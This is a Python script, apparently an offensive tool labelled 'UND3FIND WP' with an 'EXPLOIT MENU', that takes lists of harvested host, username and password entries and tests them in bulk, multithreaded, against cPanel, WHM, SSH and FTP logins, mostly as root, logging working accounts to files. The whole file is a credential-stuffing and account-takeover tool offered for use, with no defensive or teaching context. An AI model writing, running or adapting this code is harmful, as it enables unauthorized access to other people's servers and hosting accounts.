# -*- coding: utf-8 -*
#!/usr/bin/python
import paramiko, sys
import requests, re, time, threading, sys
from socket import *
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing.dummy import Pool
from colorama import Fore, Style, Back, init
import requests, re, os, sys, codecs, random, hashlib, ftplib, ssl
try:
    import urllib.request as urllib2
except ImportError:
    import urllib2
    from urllib.parse import urlparse
from multiprocessing.dummy import Pool
from time import time as timer
import time
from platform import system
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
import warnings
import subprocess
from colorama import Fore, Back, init, Style
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
init(autoreset=True)
merah = Fore.LIGHTRED_EX
hijau = Fore.LIGHTGREEN_EX
biru = Fore.BLUE
kuning = Fore.LIGHTYELLOW_EX
cyan = Fore.CYAN
reset = Fore.RESET
bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
res = Style.RESET_ALL
yl = Fore.YELLOW
cy = Fore.CYAN
mg = Fore.MAGENTA
bc = Back.GREEN
fr = Fore.RED
sr = Style.RESET_ALL
fb = Fore.BLUE
fc = Fore.LIGHTCYAN_EX
fg = Fore.GREEN
br = Back.RED
##########################################################################################
ktnred = '\033[31m'
ktngreen = '\033[32m'
ktn3yell = '\033[33m'
ktn4blue = '\033[34m'
ktn5purp = '\033[35m'
ktn6blueblue = '\033[36m'
ktn7grey = '\033[37m'
CEND = '\033[0m'
fg = [
    '\033[1;91m',  # RED     (0)
    '\033[1;92m',  # GREEN   (1)
    '\033[1;93m',  # YELLOW  (2)
    '\033[1;94m',  # BLUE    (3)
    '\033[1;95m',  # MAGENTA (4)
    '\033[1;96m',  # CYAN    (5)
    '\033[1;97m'   # YELLOW  (6)
]
from datetime import datetime
now = datetime.now()
dt_string = now.strftime("%H:%M:%S")
def ntime():
    return datetime.datetime.now().strftime('%H:%M:%S')
year = time.strftime("%y")
month = time.strftime("%m")

#####################################
##########################################################################################

##########################################################################################

#CPANELS
def cpanel(host, user, pswd):
    try:
        s = requests.Session()
        data = {"user":user,"pass":pswd}
        text = s.post("https://"+host+":2083/login", data=data, verify=False, allow_redirects=False, timeout=3).text
        if "URL=/cpses" in text:
            print(f"{fc}[{gr}VALID{fc}] {res}{host}{gr}|{res}{user}{gr}|{res}{pswd}")
            fopen = open("!Cpanelz33.txt","a")
            fopen.write("https://"+host+":2083|"+user+"|"+pswd+"\n")
            fopen.close()
        else:
            print(f"{fc}[{red}BAD{fc}] {res}{host}{red}|{res}{user}{red}|{res}{pswd}")
        s.close()
    except KeyboardInterrupt:
        print("Closed")
        exit()
    except:
        print(f"{fc}[{red}ERROR{fc}] {res}{host}{yl}|{res}{user}{yl}|{res}{pswd}")

#WHM
def whm(host, user, pswd):
    try:
        headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}
        s = requests.Session()
        data = {"user":user,"pass":pswd}
        text = s.post("https://"+host+":2087/login", data=data, headers=headers, verify=False, allow_redirects=False, timeout=15).text
        if "URL=/cpses" in text:
            print(f"{fc}[{gr}VALID{fc}] {res}{host}{gr}|{res}{user}{gr}|{res}{pswd}")
            fopen = open("!Valid_whm.txt","a")
            fopen.write(host+"|"+user+"|"+pswd+"\n")
            fopen.close()
        else:
            print(f"{fc}[{red}BAD{fc}] {res}{host}{red}|{res}{user}{red}|{res}{pswd}")
            fopen = open("DIE.txt","a")
            fopen.write(host+"|"+user+"|"+pswd+"\n")
            fopen.close()
        s.close()
    except KeyboardInterrupt:
        print("Closed")
        exit()
    except Exception as eror:
        print(f"{fc}[{red}ERROR{fc}] {res}{host}{yl}|{res}{user}{yl}|{res}{pswd}")
        fopen = open("Error.txt","a")
        fopen.write(host+"|"+user+"|"+pswd+"\n")
        fopen.close()

# SSH
def l3gion(target, username, password):
	try:
		targetIP = gethostbyname(target)
	except:
		print(f'\t{yl}╰╼[{red}INVALID {ports} {yl}IP{yl}] {fc}╾─╼{res} '+str(target))
		return False
	for i in [22]:
		s = socket(AF_INET, SOCK_STREAM)
		s.settimeout(0.5)
		result = s.connect_ex((targetIP, i))
		if(result == 0) :
			checkssh(targetIP, 22, username, password)
		else:
			print(f'\t{yl}╰╼[{red}PORT{gr}| {yl}'+str(i)+f' {gr}|{red}CLOSED{yl}]{res} '+targetIP)
		s.close()

def checkssh(ip, port, username, password):
	cmd = 'cat /proc/cpuinfo | grep processor'
	try:
		ssh=paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(ip,port,username,password, timeout=3)
		stdin,stdout,stderr=ssh.exec_command(cmd)
		outlines=stdout.readlines()
		cpu = 0
		for asu in outlines:
			cpu = cpu + 1
		build = str(ip) + '|' + str(port) + '|' + str(username) + '|' + str(password) + ' - CPU '+str(cpu)
		print(f'\t{yl}╰╼[{gr}LIVE{yl}] {fc}╾─╼{gr} '+str(build))
		save = open('!asaLegion_Ssh.txt','a')
		save.write(build+'\n')
		save.close()
	except KeyboardInterrupt:
		print('Cenceled by user')
	except Exception as err:
		build = str(ip) + '|' + str(port) + '|' + str(username) + '|' + str(password)
		print(f'\t{yl}╰╼[{red}DIE{yl}] {fc}╾─╼{res} '+str(build))



def bagian3(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = 'root'
        password = prepare[3]
        l3gion(host, user, password)
    except:
        pass
    pass

#FTP
def gas(host,username,password):
    try:
        ftp=ftplib.FTP(host,timeout=15)
        login_response = ftp.login(username, password)
        if '230 OK' in login_response:
            print (f"{fc}[{gr}{dt_string}{fc}] {fc}[{gr}{host}{fc}] ╾┄╼ {fc}[{yl}{username}{fc}|{res}{password}{fc}] {fc} ╾┄╼{gr}LIVE")
            open('lives.txt', 'a').write(host+'|'+username+'|'+password+'\n')
        else:
            print (f"{fc}[{gr}{dt_string}{fc}] {fc}[{red}{host}{fc}] ╾┄╼ {fc}[{mg}{username}{fc}|{res}{password}{fc}] {fc} ╾┄╼{red}DIE")
    except:
        print (f"{fc}[{gr}{dt_string}{fc}] {fc}[{red}{host}{fc}] ╾┄╼ {fc}[{mg}{username}{fc}|{res}{password}{fc}] {fc} ╾┄╼{red}DIE")


def bagian(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = prepare[3]
        password = prepare[4]
        cpanel(host, user, password)
        if "_" in prepare[3]:
            userr = prepare[3].split("_")[0]
            ppp = str(userr)
            cpanel(host, ppp, password)
    except:
        pass
    pass


def bagian2(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = 'root'
        password = prepare[4]
        whm(host, user, password)
    except:
        pass
    pass


def bagian4(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = prepare[3]
        password = prepare[4]
        gas(host, user, password)
        if "_" in prepare[3]:
            userr = prepare[3].split("_")[0]
            ppp = str(userr)
            gas(host, ppp, password)
    except:
        pass
    pass


#####################################


def banner():
    print(f'''
██    ██ ███    ██ ██████  ██████  ███████ ██████  ██ ███    ██ ██████  
██    ██ ████   ██ ██   ██      ██ ██           ██ ██ ████   ██ ██   ██ 
██    ██ ██ ██  ██ ██   ██  █████  █████    █████  ██ ██ ██  ██ ██   ██ 
██    ██ ██  ██ ██ ██   ██      ██ ██           ██ ██ ██  ██ ██ ██   ██ 
 ██████  ██   ████ ██████  ██████  ██      ██████  ██ ██   ████ ██████  



{fc}EXPLOIT MENU
{red}───┬───────────────
   {red}└╼ {fc}[{gr}1{fc}]{red} {red}EXPLOIT {gr}CPANELS
   {red}└╼ {fc}[{gr}2{fc}]{red} {red}EXPLOIT {gr}WHM
   {red}└╼ {fc}[{gr}3{fc}]{red} {red}EXPLOIT {gr}SSH
   {red}└╼ {fc}[{gr}4{fc}]{red} {red}EXPLOIT {gr}FTP

'''.format(
    fg[0], fg[5], fg[1], fg[2], fg[6], fg[3], fg[4],
    reset=reset, f1=list,))
def LaravelBot():
    #brand()
    banner()

    while True:
        print(f'{red}┌─{res}[{cy}UND3FIND WP{res}]{gr}─{res}[{mg}/{gr}Give me your Choice{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
        choice = input('')
        if choice == "1":
            try:
                list = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP \033[32;1m+ \033[31;1mBonjour\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
                lists = open(list, 'r').read().split('\n')

                print('''
                    1.MultiProcessing
                    2.ThreadPool
                ''')
                chosethrd = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Choice\033[31;1m]\n└─╼\033[32;1m#')
                if chosethrd == '1':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(bagian, lists)
                if chosethrd == '2':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(bagian, lists)
                else:
                    thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(bagian, listss)
            except:
                print('{}Wrong'.format(fr))
        if choice == "2":
            try:
                list = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP \033[32;1m+ \033[31;1mBonjour\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
                lists = open(list, 'r').read().split('\n')

                print('''
                    1.MultiProcessing
                    2.ThreadPool
                ''')
                chosethrd = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Choice\033[31;1m]\n└─╼\033[32;1m#')
                if chosethrd == '1':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(bagian2, lists)
                if chosethrd == '2':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(bagian2, lists)
                else:
                    thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(bagian2, listss)
            except:
                print('{}Wrong'.format(fr))
        if choice == "3":
            try:
                list = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP \033[32;1m+ \033[31;1mBonjour\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
                lists = open(list, 'r').read().split('\n')

                print('''
                    1.MultiProcessing
                    2.ThreadPool
                ''')
                chosethrd = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Choice\033[31;1m]\n└─╼\033[32;1m#')
                if chosethrd == '1':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(bagian3, lists)
                if chosethrd == '2':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(bagian3, lists)
                else:
                    thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(bagian3, listss)
            except:
                print('{}Wrong'.format(fr))
        if choice == "4":
            try:
                list = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP \033[32;1m+ \033[31;1mBonjour\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
                lists = open(list, 'r').read().split('\n')

                print('''
                    1.MultiProcessing
                    2.ThreadPool
                ''')
                chosethrd = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Choice\033[31;1m]\n└─╼\033[32;1m#')
                if chosethrd == '1':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(bagian4, lists)
                if chosethrd == '2':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(bagian4, lists)
                else:
                    thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mUND3FIND WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(bagian4, listss)
            except:
                print('{}Wrong'.format(fr))
LaravelBot()
##########################################################################################
